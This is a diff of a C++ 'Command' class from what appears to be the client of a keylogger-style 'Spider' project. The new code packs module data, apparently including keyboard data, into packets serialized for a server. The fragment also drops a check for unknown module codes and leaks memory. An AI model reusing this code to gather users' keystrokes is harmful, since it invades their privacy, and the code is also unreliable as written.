@@ -3,7 +3,8 @@
 //
 
 #include <iostream>
-#include "Command.h"
+#include "client/SpiderClient.hpp"
+#include "client/Command.hpp"
 
 Command::Command() {}
 
@@ -12,29 +13,30 @@ Command::~Command() {}
 /*
  * Process découpe la commande reçu par le serveur puis la traite.
  */
-t_paquet           *Command::process(std::map<char, Module> modules, std::string received)
+void                        Command::process(std::map<char, Module> modules, std::string received, boost::asio::streambuf &buf)
 {
-  char        code = received[0];
-  Module	module;
-  t_paquet    *paquet;
+    std::ostream                    os(&buf);
+    boost::archive::text_oarchive   ar(os);
+    char                            code = received[0];
 
-
-  if (modules.find(code) != modules.end())
-    return NULL;
-  module = modules[code];
-  paquet = getMessage(module);
-  return paquet;
+    Module                          module = modules[code];
+    t_paquet                       *data = getMessageFormat(module);
+    ar & data;
 }
 
 /*
  * Créer la structure à renvoyer au serveur.
  */
-t_paquet     *Command::getMessage(Module module)
+t_paquet                    *Command::getMessageFormat(Module module)
 {
-    t_paquet    *paquet = new t_paquet;
+    size_t      dataMax = 512 / module.getDataSize();
+    t_paquet    *data = new t_paquet;
 
-        paquet->opcode = module.getOpcode();
-        paquet->data = (void *)module.getData();
-
-    return (paquet);
+    data->kbData = NULL;
+    data->opcode = 0;
+    data->opcode = module.getOpcode();
+    for (int i = 0; i < dataMax; i++) {
+        module.addNextData(data);
+    }
+    return data;
 }
